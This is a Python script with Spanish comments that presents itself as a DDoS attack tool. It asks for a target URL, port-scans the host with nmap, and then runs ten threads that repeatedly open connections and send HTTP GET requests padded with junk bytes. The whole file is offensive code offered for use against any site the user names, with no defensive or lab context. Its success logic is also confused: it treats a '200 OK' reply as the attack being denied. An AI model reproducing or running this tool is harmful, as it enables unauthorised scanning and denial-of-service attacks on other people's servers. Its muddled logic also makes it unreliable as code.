import socket
import urllib.parse
import urllib.error
import threading
import nmap

def scan_open_ports(url):
    """Función para escanear los puertos abiertos de la URL."""
    try:
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname

        nm = nmap.PortScanner()
        nm.scan(host)
        open_ports = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    if nm[host][proto][port]['state'] == 'open':
                        open_ports.append(port)
        return open_ports
    except Exception as e:
        print(f"Error al escanear puertos abiertos: {e}")
        return []

def send_attack(host, port, requestData, success_flag):
    """Función para enviar una solicitud de ataque DDoS a un host y puerto."""
    try:
        while not success_flag.is_set():  # Continuar atacando hasta que la bandera de éxito esté establecida
            with socket.create_connection((host, port), timeout=5) as s:
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
                payload = request.encode() + requestData
                s.sendall(payload)
                response = s.recv(1024)  # Recibimos la respuesta de la solicitud
                if b"200 OK" in response:  # Si la respuesta contiene "200 OK", consideramos que el ataque fue denegado
                    success_flag.set()  # Establecemos la bandera de éxito
    except (socket.error, socket.timeout) as e:
        pass  # Ignoramos los errores de conexión

def ddos_attack(url):
    """Función para realizar un ataque DDoS."""
    try:
        open_ports = scan_open_ports(url)
        if open_ports:
            print("Puertos abiertos:", open_ports)
        else:
            print("No se encontraron puertos abiertos.")

        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        port = parsed_url.port

        if port is None:
            port = 443 if parsed_url.scheme == "https" else 80

        inet_address = socket.gethostbyname(host)
        requestData = b"X" * 1024

        success_flag = threading.Event()  # Creamos una bandera de éxito
        threads = []
        for _ in range(10):  # Podemos definir un número máximo de hilos para el ataque
            t = threading.Thread(target=send_attack, args=(host, port, requestData, success_flag))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if success_flag.is_set():  # Si la bandera de éxito está establecida, significa que el ataque fue denegado
            print("ATAQUE DENEGADO")
        else:
            print("ATAQUE EXITOSO")

    except urllib.error.URLError as e:
        print("URL inválida:", url)
        print(e)
    except (socket.error, ValueError, KeyboardInterrupt) as e:
        print(f"Ocurrió un error: {e}")

def ddos_attack_main():
    """Función principal para iniciar el ataque DDoS."""
    try:
        respuesta = input("¿Desea realizar un ataque DDoS? (s/n): ")

        if respuesta.lower() == "s":
            url = input("Ingresa la URL completa del host: ")
            ddos_attack(url)
    except KeyboardInterrupt:
        print("\nAtaque DDoS interrumpido.")

if __name__ == "__main__":
    ddos_attack_main()
